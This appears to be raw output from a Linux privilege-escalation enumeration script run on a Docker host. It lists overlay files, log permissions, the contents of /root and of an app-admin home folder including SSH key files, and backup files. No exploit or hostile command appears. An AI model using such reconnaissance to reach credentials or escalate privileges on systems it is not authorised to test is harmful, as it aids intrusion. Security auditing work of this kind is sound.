2025-05-31+07:53:48.7818938300 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa-init/diff/etc/resolv.conf
2025-05-31+07:53:48.7818938300 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa-init/diff/etc/hosts
2025-05-31+07:53:48.7818938300 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa-init/diff/.dockerenv
2025-05-31+07:53:48.7818938300 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa-init/diff/dev/console
2025-05-31+07:53:48.7808938300 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/etc/hostname
2025-05-31+07:53:48.7808938300 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa-init/diff/etc/hostname
2025-05-31+07:53:30.0208947040 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/etc/resolv.conf
2025-05-31+07:53:30.0208947040 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/etc/hosts
2025-05-31+07:53:30.0208947040 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/etc/hostname
2025-05-31+07:53:30.0208947040 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/.dockerenv
2025-05-31+07:53:30.0208947040 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/dev/console
2025-05-31+07:53:30.0208947040 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f-init/diff/etc/resolv.conf
2025-05-31+07:53:30.0208947040 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f-init/diff/etc/hosts
2025-05-31+07:53:30.0208947040 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f-init/diff/etc/hostname
2025-05-31+07:53:30.0208947040 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f-init/diff/.dockerenv
2025-05-31+07:53:30.0208947040 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f-init/diff/dev/console
2025-05-20+07:36:24.2979696530 /var/lib/docker/overlay2/856ba5fa374bd344a230136883bb5dd8017a42e700bb5768d1fef86daa0baf95-init/diff/etc/resolv.conf
2025-05-20+07:36:24.2979696530 /var/lib/docker/overlay2/856ba5fa374bd344a230136883bb5dd8017a42e700bb5768d1fef86daa0baf95-init/diff/dev/console
2025-05-20+07:36:24.2969696550 /var/lib/docker/overlay2/856ba5fa374bd344a230136883bb5dd8017a42e700bb5768d1fef86daa0baf95-init/diff/etc/hosts
2025-05-20+07:36:24.2969696550 /var/lib/docker/overlay2/856ba5fa374bd344a230136883bb5dd8017a42e700bb5768d1fef86daa0baf95-init/diff/etc/hostname
2025-05-20+07:36:24.2959696570 /var/lib/docker/overlay2/856ba5fa374bd344a230136883bb5dd8017a42e700bb5768d1fef86daa0baf95-init/diff/.dockerenv
2025-05-19+14:42:48.6306442810 /var/lib/docker/overlay2/b3b0327069909f56c2b90204f7753d140f8225a5b20686194c15407256a5f7be-init/diff/etc/hosts
2025-05-19+14:42:48.6306442810 /var/lib/docker/overlay2/b3b0327069909f56c2b90204f7753d140f8225a5b20686194c15407256a5f7be-init/diff/dev/console
2025-05-19+14:42:48.6296442840 /var/lib/docker/overlay2/b3b0327069909f56c2b90204f7753d140f8225a5b20686194c15407256a5f7be-init/diff/etc/resolv.conf
2025-05-19+14:42:48.6296442840 /var/lib/docker/overlay2/b3b0327069909f56c2b90204f7753d140f8225a5b20686194c15407256a5f7be-init/diff/etc/hostname
2025-05-19+14:42:48.6286442860 /var/lib/docker/overlay2/b3b0327069909f56c2b90204f7753d140f8225a5b20686194c15407256a5f7be-init/diff/.dockerenv
2025-05-12+09:42:04.2247948360 /var/lib/docker/overlay2/ba65abb7a35c23a3e3520aa362bba2752cfd06ddf7db7a163a18b0fb7ebb80f0-init/diff/etc/resolv.conf
2025-05-12+09:42:04.2247948360 /var/lib/docker/overlay2/ba65abb7a35c23a3e3520aa362bba2752cfd06ddf7db7a163a18b0fb7ebb80f0-init/diff/etc/hosts
2025-05-12+09:42:04.2247948360 /var/lib/docker/overlay2/ba65abb7a35c23a3e3520aa362bba2752cfd06ddf7db7a163a18b0fb7ebb80f0-init/diff/etc/hostname
2025-05-12+09:42:04.2247948360 /var/lib/docker/overlay2/ba65abb7a35c23a3e3520aa362bba2752cfd06ddf7db7a163a18b0fb7ebb80f0-init/diff/.dockerenv
2025-05-12+09:42:04.2247948360 /var/lib/docker/overlay2/ba65abb7a35c23a3e3520aa362bba2752cfd06ddf7db7a163a18b0fb7ebb80f0-init/diff/dev/console
2025-05-12+09:37:56.9436107030 /var/lib/docker/overlay2/6741420f8bb88e244b24dc7d288487f5b1ca4f22f248498fdbc438310c6a10f2-init/diff/dev/console
2025-05-12+09:26:45.9430699470 /var/lib/docker/overlay2/28f02735265980908e5f6353ef7e2a4cde5c546d9e519d5ee29e5e0d45db28f8-init/diff/dev/console
2025-05-12+09:26:45.9420699510 /var/lib/docker/overlay2/28f02735265980908e5f6353ef7e2a4cde5c546d9e519d5ee29e5e0d45db28f8-init/diff/etc/resolv.conf
2025-05-12+09:26:45.9420699510 /var/lib/docker/overlay2/28f02735265980908e5f6353ef7e2a4cde5c546d9e519d5ee29e5e0d45db28f8-init/diff/etc/hosts
2025-05-12+09:26:45.9420699510 /var/lib/docker/overlay2/28f02735265980908e5f6353ef7e2a4cde5c546d9e519d5ee29e5e0d45db28f8-init/diff/etc/hostname
2025-05-12+09:26:45.9420699510 /var/lib/docker/overlay2/28f02735265980908e5f6353ef7e2a4cde5c546d9e519d5ee29e5e0d45db28f8-init/diff/.dockerenv
2025-05-12+09:24:10.7607097710 /root/hot/server/frontend/public/assets/dummy.css
2025-05-12+09:20:44.1123168340 /var/lib/docker/overlay2/6c1a72cd4ece2f5ac6a1811aab56e1fc5698be309d472d1baded1d0a9983f097-init/diff/etc/resolv.conf
2025-05-12+09:20:44.1123168340 /var/lib/docker/overlay2/6c1a72cd4ece2f5ac6a1811aab56e1fc5698be309d472d1baded1d0a9983f097-init/diff/etc/hosts
2025-05-12+09:20:44.1123168340 /var/lib/docker/overlay2/6c1a72cd4ece2f5ac6a1811aab56e1fc5698be309d472d1baded1d0a9983f097-init/diff/etc/hostname
2025-05-12+09:20:44.1123168340 /var/lib/docker/overlay2/6c1a72cd4ece2f5ac6a1811aab56e1fc5698be309d472d1baded1d0a9983f097-init/diff/.dockerenv
2025-05-12+09:20:44.1123168340 /var/lib/docker/overlay2/6c1a72cd4ece2f5ac6a1811aab56e1fc5698be309d472d1baded1d0a9983f097-init/diff/dev/console
2025-05-12+09:07:24.5487262880 /var/lib/docker/overlay2/ff45cfa56415f68b2e0e65ac6ec41844a88575bb211fae66961718df357a3f5c-init/diff/etc/resolv.conf
2025-05-12+09:07:24.5487262880 /var/lib/docker/overlay2/ff45cfa56415f68b2e0e65ac6ec41844a88575bb211fae66961718df357a3f5c-init/diff/etc/hosts
2025-05-12+09:07:24.5487262880 /var/lib/docker/overlay2/ff45cfa56415f68b2e0e65ac6ec41844a88575bb211fae66961718df357a3f5c-init/diff/etc/hostname
2025-05-12+09:07:24.5487262880 /var/lib/docker/overlay2/ff45cfa56415f68b2e0e65ac6ec41844a88575bb211fae66961718df357a3f5c-init/diff/.dockerenv
2025-05-12+09:07:24.5487262880 /var/lib/docker/overlay2/ff45cfa56415f68b2e0e65ac6ec41844a88575bb211fae66961718df357a3f5c-init/diff/dev/console
2025-05-12+09:06:38.1468718380 /var/lib/docker/overlay2/e9d6df2012ce51a5e693fbe8e2b40b44ef53b2c55e0722a8cf67250b49be6bf9-init/diff/etc/resolv.conf
2025-05-12+09:06:38.1468718380 /var/lib/docker/overlay2/e9d6df2012ce51a5e693fbe8e2b40b44ef53b2c55e0722a8cf67250b49be6bf9-init/diff/etc/hosts
2025-05-12+09:06:38.1468718380 /var/lib/docker/overlay2/e9d6df2012ce51a5e693fbe8e2b40b44ef53b2c55e0722a8cf67250b49be6bf9-init/diff/etc/hostname
2025-05-12+09:06:38.1468718380 /var/lib/docker/overlay2/e9d6df2012ce51a5e693fbe8e2b40b44ef53b2c55e0722a8cf67250b49be6bf9-init/diff/.dockerenv
2025-05-12+09:06:38.1468718380 /var/lib/docker/overlay2/e9d6df2012ce51a5e693fbe8e2b40b44ef53b2c55e0722a8cf67250b49be6bf9-init/diff/dev/console
2025-05-12+08:52:01.5599921190 /root/hot/server/frontend/src/dummy.css
2025-05-12+07:47:20.7596711930 /var/lib/docker/overlay2/815ad6d986d64cacd9f9ac5258f44cb543549b150f49fc65f01d8688ef6dd75a-init/diff/etc/resolv.conf
2025-05-12+07:47:20.7596711930 /var/lib/docker/overlay2/815ad6d986d64cacd9f9ac5258f44cb543549b150f49fc65f01d8688ef6dd75a-init/diff/etc/hosts
2025-05-12+07:47:20.7596711930 /var/lib/docker/overlay2/815ad6d986d64cacd9f9ac5258f44cb543549b150f49fc65f01d8688ef6dd75a-init/diff/etc/hostname
2025-05-12+07:47:20.7596711930 /var/lib/docker/overlay2/815ad6d986d64cacd9f9ac5258f44cb543549b150f49fc65f01d8688ef6dd75a-init/diff/dev/console
2025-05-12+07:47:20.7586711940 /var/lib/docker/overlay2/815ad6d986d64cacd9f9ac5258f44cb543549b150f49fc65f01d8688ef6dd75a-init/diff/.dockerenv
2025-05-02+12:37:34.0052742550 /var/lib/docker/overlay2/0bc1e99e1076caf05540280b8692c01222189a70ffc8129ece7180ab37fe515b-init/diff/etc/resolv.conf
2025-05-02+12:37:34.0052742550 /var/lib/docker/overlay2/0bc1e99e1076caf05540280b8692c01222189a70ffc8129ece7180ab37fe515b-init/diff/etc/hosts
2025-05-02+12:37:34.0052742550 /var/lib/docker/overlay2/0bc1e99e1076caf05540280b8692c01222189a70ffc8129ece7180ab37fe515b-init/diff/etc/hostname
2025-05-02+12:37:34.0052742550 /var/lib/docker/overlay2/0bc1e99e1076caf05540280b8692c01222189a70ffc8129ece7180ab37fe515b-init/diff/.dockerenv
2025-05-02+12:37:34.0052742550 /var/lib/docker/overlay2/0bc1e99e1076caf05540280b8692c01222189a70ffc8129ece7180ab37fe515b-init/diff/dev/console
2025-05-02+11:57:20.8238941610 /var/lib/docker/overlay2/83e20564cdcf09b31c33ab4b04a335a2e6e37b5bcec022bfd831b46a32364dc2-init/diff/etc/hosts
2025-05-02+11:57:20.8238941610 /var/lib/docker/overlay2/83e20564cdcf09b31c33ab4b04a335a2e6e37b5bcec022bfd831b46a32364dc2-init/diff/.dockerenv

╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                                                                                                                                                    
drwxr-xr-x  3 root root 4096 May  2 11:35 .
drwxr-xr-x 24 root root 4096 May 19 11:16 ..
drwx--x--x  4 root root 4096 May  1 11:10 containerd

╔══════════╣ Unexpected in root
/swap.img                                                                                                                                                                                                                                   
/www
/sbin.usr-is-merged
/lib.usr-is-merged
/bin.usr-is-merged

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/root/.gnupg/pubring.kbx                                                                                                                                                                                                                    
/root/.gnupg/trustdb.gpg
/var/log/sysstat/sa19
/var/log/auth.log
/var/log/journal/17c8ea46eabb43848e89bf05e5b2b51f/system.journal
/var/log/kern.log
/var/log/syslog

╔══════════╣ Syslog configuration (limit 50)
                                                                                                                                                                                                                                            


module(load="imuxsock") # provides support for local system logging



module(load="imklog" permitnonkernelfacility="on")


$RepeatedMsgReduction on

$FileOwner syslog
$FileGroup adm
$FileCreateMode 0640
$DirCreateMode 0755
$Umask 0022
$PrivDropToUser syslog
$PrivDropToGroup syslog

$WorkDirectory /var/spool/rsyslog

$IncludeConfig /etc/rsyslog.d/*.conf
╔══════════╣ Auditd configuration (limit 50)
auditd configuration Not Found                                                                                                                                                                                                              
╔══════════╣ Log files with potentially weak perms (limit 50)                                                                                                                                                                               
    30229   1404 -rw-r-----   1 syslog   adm       1435515 Jul 19 07:20 /var/log/syslog.1                                                                                                                                                   
     2528    140 -rw-r-----   1 root     adm        142119 May 26 13:32 /var/log/dmesg.0
    27644     28 -rw-r-----   1 root     adm         26301 May  2 11:27 /var/log/dmesg.4.gz
    15985      4 -rw-r-----   1 syslog   adm          2275 May 10 00:34 /var/log/kern.log.4.gz
    36727      8 -rw-r-----   1 syslog   adm          6019 Jul 19 09:22 /var/log/auth.log
    42297      0 -rw-r-----   1 root     adm                    0 May  1 10:31 /var/log/apport.log
    23610      4 -rw-r-----   1 syslog   adm                  861 May 20 07:51 /var/log/auth.log.2.gz
    36700      0 -rw-r-----   1 root     adm                    0 Jul 19 07:20 /var/log/apt/term.log
    36702     28 -rw-r-----   1 root     adm                27468 May 19 10:31 /var/log/apt/term.log.1.gz
    36725      8 -rw-r-----   1 syslog   adm                 7118 Jul 19 09:22 /var/log/kern.log
    15984     80 -rw-r-----   1 syslog   adm                78158 May 11 00:00 /var/log/syslog.4.gz
    30235     40 -rw-r-----   1 syslog   adm                35210 May 31 07:54 /var/log/auth.log.1
    36729      8 -rw-r--r--   1 root     adm                 4487 May 16 06:21 /var/log/unattended-upgrades/unattended-upgrades-dpkg.log.1.gz
    36379      0 -rw-r--r--   1 root     adm                    0 Jul 19 07:20 /var/log/unattended-upgrades/unattended-upgrades-dpkg.log
    30233    360 -rw-r-----   1 syslog   adm               367604 May 31 07:54 /var/log/kern.log.1
    42225     72 -rw-r-----   1 syslog   adm                70973 May  1 10:32 /var/log/cloud-init.log
    26152    140 -rw-r-----   1 root     adm               142296 May 26 13:32 /var/log/dmesg
    23609     48 -rw-r-----   1 syslog   adm                48455 May 26 13:30 /var/log/kern.log.2.gz
    36714    196 -rw-r-----   1 syslog   adm               198496 May 26 13:30 /var/log/syslog.2.gz
    23615    120 -rw-r-----   1 syslog   adm               117214 Jul 19 09:23 /var/log/syslog
    15986     28 -rw-r-----   1 syslog   adm                24873 May 10 23:59 /var/log/auth.log.4.gz
    29169     28 -rw-r-----   1 syslog   adm                28417 May 17 13:35 /var/log/kern.log.3.gz
    25806     28 -rw-r-----   1 root     adm                26379 May 12 07:42 /var/log/dmesg.3.gz
    42229      8 -rw-r-----   1 root     adm                 4100 May  1 10:32 /var/log/cloud-init-output.log
     2526     28 -rw-r-----   1 root     adm                26670 May 19 12:26 /var/log/dmesg.2.gz
    29168    172 -rw-r-----   1 syslog   adm               175386 May 18 00:00 /var/log/syslog.3.gz
    29170     28 -rw-r-----   1 syslog   adm                26373 May 17 23:59 /var/log/auth.log.3.gz
     2519     28 -rw-r-----   1 root     adm                26709 May 20 07:35 /var/log/dmesg.1.gz

╔══════════╣ Files inside /root (limit 20)
total 52                                                                                                                                                                                                                                    
drwx------  8 root root 4096 Jul 19 09:22 .
drwxr-xr-x 24 root root 4096 May 19 11:16 ..
drwxr-xr-x  2 root root 4096 May 12 09:39 app2
-rw-------  1 root root    0 May 31 07:54 .bash_history
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  3 root root 4096 Jul 19 09:22 .gnupg
drwxr-xr-x  4 root root 4096 May 12 08:29 hot
-rw-------  1 root root   20 May 12 07:56 .lesshst
drwxr-xr-x  3 root root 4096 May  1 10:37 .local
drwxr-xr-x  4 root root 4096 May 12 08:40 .npm
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
-rw-------  1 root root   16 Jul 19 09:10 .python_history
drwx------  2 root root 4096 May  1 10:31 .ssh
-rw-------  1 root root 1468 Jul 19 09:07 .viminfo

╔══════════╣ Files inside others home (limit 20)
/home/app-admin/.bash_logout                                                                                                                                                                                                                
/home/app-admin/.bash_history
/home/app-admin/.profile
/home/app-admin/.sudo_as_admin_successful
/home/app-admin/.cache/motd.legal-displayed
/home/app-admin/.bashrc
/home/app-admin/.ssh/authorized_keys

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                            
╔══════════╣ Backup folders
drwxr-xr-x 3 root root 4096 Feb 16 21:04 /usr/lib/python3/dist-packages/botocore/data/backup                                                                                                                                                
total 4
drwxr-xr-x 2 root root 4096 Feb 16 21:04 2018-11-15

drwxr-xr-x 2 root root 4096 May 20 00:00 /var/backups
total 2572
-rw-r--r-- 1 root root   40960 May  3 00:00 alternatives.tar.0
-rw-r--r-- 1 root root    2215 May  2 00:00 alternatives.tar.1.gz
-rw-r--r-- 1 root root   67464 May 19 10:30 apt.extended_states.0
-rw-r--r-- 1 root root    7284 May 16 06:21 apt.extended_states.1.gz
-rw-r--r-- 1 root root    7281 May 12 10:52 apt.extended_states.2.gz
-rw-r--r-- 1 root root    4495 May  7 06:35 apt.extended_states.3.gz
-rw-r--r-- 1 root root    4506 May  2 11:45 apt.extended_states.4.gz
-rw-r--r-- 1 root root    4469 May  2 06:07 apt.extended_states.5.gz
-rw-r--r-- 1 root root    4437 May  1 13:40 apt.extended_states.6.gz
-rw-r--r-- 1 root root       0 May 20 00:00 dpkg.arch.0
-rw-r--r-- 1 root root      32 May 17 00:00 dpkg.arch.1.gz
-rw-r--r-- 1 root root      32 May 16 00:00 dpkg.arch.2.gz
-rw-r--r-- 1 root root      32 May 13 00:00 dpkg.arch.3.gz
-rw-r--r-- 1 root root      32 May  8 00:00 dpkg.arch.4.gz
-rw-r--r-- 1 root root      32 May  3 00:00 dpkg.arch.5.gz
-rw-r--r-- 1 root root      32 May  2 00:00 dpkg.arch.6.gz
-rw-r--r-- 1 root root    1518 May  1 10:27 dpkg.diversions.0
-rw-r--r-- 1 root root     312 May  1 10:27 dpkg.diversions.1.gz
-rw-r--r-- 1 root root     312 May  1 10:27 dpkg.diversions.2.gz
-rw-r--r-- 1 root root     312 May  1 10:27 dpkg.diversions.3.gz
-rw-r--r-- 1 root root     312 May  1 10:27 dpkg.diversions.4.gz
-rw-r--r-- 1 root root     312 May  1 10:27 dpkg.diversions.5.gz
-rw-r--r-- 1 root root     312 May  1 10:27 dpkg.diversions.6.gz
-rw-r--r-- 1 root root     172 May 19 10:31 dpkg.statoverride.0
-rw-r--r-- 1 root root     130 May  1 13:40 dpkg.statoverride.1.gz
-rw-r--r-- 1 root root     130 May  1 13:40 dpkg.statoverride.2.gz
-rw-r--r-- 1 root root     130 May  1 13:40 dpkg.statoverride.3.gz
-rw-r--r-- 1 root root     130 May  1 13:40 dpkg.statoverride.4.gz
-rw-r--r-- 1 root root     130 May  1 13:40 dpkg.statoverride.5.gz
-rw-r--r-- 1 root root     130 May  1 13:40 dpkg.statoverride.6.gz
-rw-r--r-- 1 root root 1087986 May 19 10:31 dpkg.status.0
-rw-r--r-- 1 root root  249477 May 16 06:21 dpkg.status.1.gz
-rw-r--r-- 1 root root  249298 May 15 06:01 dpkg.status.2.gz
-rw-r--r-- 1 root root  249297 May 12 10:52 dpkg.status.3.gz
-rw-r--r-- 1 root root  180952 May  7 06:35 dpkg.status.4.gz
-rw-r--r-- 1 root root  180755 May  2 11:45 dpkg.status.5.gz
-rw-r--r-- 1 root root  178833 May  1 13:40 dpkg.status.6.gz

drwxr-xr-x 2 root root 4096 Aug 14  2024 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/var/backups
total 0

drwxr-xr-x 2 root root 4096 Mar  7 17:30 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/var/backups
total 0

drwxr-xr-x 2 root root 4096 Mar  7 17:30 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/var/backups
total 0


╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 2586 Jul 17  2024 /usr/libexec/dpkg/dpkg-db-backup                                                                                                                                                                   
-rw-r--r-- 1 root root 11843 May  2 06:06 /usr/share/info/dir.old
-rw-r--r-- 1 root root 3132 Feb 16 21:04 /usr/share/man/man8/vgcfgbackup.8.gz
-rwxr-xr-x 1 root root 226 Feb 16 21:04 /usr/share/byobu/desktop/byobu.desktop.old
-rwxr-xr-x 1 root root 1513 Jan 23  2020 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
-rw-r--r-- 1 root root 445715 Feb 16 21:04 /usr/share/doc/manpages/Changes.old.gz
-rwxr-xr-x 1 root root 28003 Mar 10  2024 /usr/src/linux-headers-6.8.0-60/tools/testing/selftests/net/test_bridge_backup_port.sh
-rwxr-xr-x 1 root root 1086 Mar 10  2024 /usr/src/linux-headers-6.8.0-60/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rwxr-xr-x 1 root root 28003 Mar 10  2024 /usr/src/linux-headers-6.8.0-59/tools/testing/selftests/net/test_bridge_backup_port.sh
-rwxr-xr-x 1 root root 1086 Mar 10  2024 /usr/src/linux-headers-6.8.0-59/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 154 Feb  6  2024 /usr/lib/systemd/system/dpkg-db-backup.timer
-rw-r--r-- 1 root root 147 Feb  5  2024 /usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r-- 1 root root 3509 Apr 11 20:44 /usr/lib/modules/6.8.0-59-generic/kernel/drivers/power/supply/wm831x_backup.ko.zst
-rw-r--r-- 1 root root 4351 Apr 11 20:44 /usr/lib/modules/6.8.0-59-generic/kernel/drivers/net/team/team_mode_activebackup.ko.zst
-rw-r--r-- 1 root root 3501 Apr 15 17:24 /usr/lib/modules/6.8.0-60-generic/kernel/drivers/power/supply/wm831x_backup.ko.zst
-rw-r--r-- 1 root root 4355 Apr 15 17:24 /usr/lib/modules/6.8.0-60-generic/kernel/drivers/net/team/team_mode_activebackup.ko.zst
-rw-r--r-- 1 root root 1898 Feb 16 21:04 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-312.pyc
-rw-r--r-- 1 root root 1759 Feb 16 21:04 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 43976 May  6 12:22 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 4096 Jul 19 09:22 /sys/devices/virtual/net/veth2c80ddd/brport/backup_port
-rw-r--r-- 1 root root 4096 Jul 19 09:22 /sys/devices/virtual/net/veth5e08161/brport/backup_port
-rw-r--r-- 1 root root 175 May 26 13:32 /www/hothostdata/process/LOG.old
-rw-r--r-- 1 root root 0 Jul 19 07:20 /var/lib/systemd/timers/stamp-dpkg-db-backup.timer
-rw-r--r-- 1 root root 0 Feb 16 20:51 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rw-r--r-- 1 root root 61 Feb 16 20:57 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
-rw-r--r-- 1 root root 159 Feb 16 20:58 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 3754 May 12 09:26 /var/lib/docker/overlay2/9c7c1aeab1cc3b4f6f05219791d7ae0270666c0cc870afe90a4a72a3d9f6422e/diff/code/node_modules/classic-level/deps/leveldb/port-libuv/port_uv.h.bak
-rw-r--r-- 1 root root 3754 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/classic-level/deps/leveldb/port-libuv/port_uv.h.bak
-rwxr-xr-x 1 root root 2569 May 11  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/libexec/dpkg/dpkg-db-backup
-rw-r--r-- 1 root root 138 Mar 27  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/lib/systemd/system/dpkg-db-backup.timer
-rw-r--r-- 1 root root 147 Mar 27  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r-- 1 root root 0 Oct 16  2024 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rw-r--r-- 1 root root 61 Oct 16  2024 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
-rwxr-xr-x 1 root root 2569 May 11  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/libexec/dpkg/dpkg-db-backup
-rw-r--r-- 1 root root 138 Mar 27  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/lib/systemd/system/dpkg-db-backup.timer
-rw-r--r-- 1 root root 147 Mar 27  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r-- 1 root root 0 Apr 28 00:00 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rw-r--r-- 1 root root 61 Apr 28 00:00 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
-rw-r--r-- 1 root root 3754 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/classic-level/deps/leveldb/port-libuv/port_uv.h.bak
-rw-r--r-- 1 root root 3754 May  1 14:32 /var/lib/docker/overlay2/6ac2995afbd0079e50c81993166be79f92e2e0e9351650aa484c963b36904ba3/diff/code/node_modules/classic-level/deps/leveldb/port-libuv/port_uv.h.bak
-rw-r--r-- 1 root root 3754 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/classic-level/deps/leveldb/port-libuv/port_uv.h.bak
-rw-r--r-- 1 root root 3754 May 12 09:20 /var/lib/docker/overlay2/f2d49efd1b8698efe99b8392fe446f3838334d5f7fc571e0c8351e2cf50ef9f5/diff/code/node_modules/classic-level/deps/leveldb/port-libuv/port_uv.h.bak
-rw-r--r-- 1 root root 3754 May  1 15:24 /var/lib/docker/overlay2/6f87ea28c8195ebecdb9ac2b29d838697814d907141c49804c92cc321fe908d6/diff/code/node_modules/classic-level/deps/leveldb/port-libuv/port_uv.h.bak
-rw-r--r-- 1 root root 3754 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/classic-level/deps/leveldb/port-libuv/port_uv.h.bak
-rwxr-xr-x 1 root root 2569 May 11  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/libexec/dpkg/dpkg-db-backup
-rw-r--r-- 1 root root 138 Mar 27  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/lib/systemd/system/dpkg-db-backup.timer
-rw-r--r-- 1 root root 147 Mar 27  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r-- 1 root root 0 Apr 28 00:00 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rw-r--r-- 1 root root 61 Apr 28 00:00 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
-rw-r--r-- 1 root root 3754 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/classic-level/deps/leveldb/port-libuv/port_uv.h.bak
-rw-r--r-- 1 root root 365 Feb 16 20:58 /etc/xml/polkitd.xml.old
-rw-r--r-- 1 root root 893 Feb 16 20:58 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Feb 16 20:58 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 862 Feb 16 20:57 /etc/.resolv.conf.systemd-resolved.bak

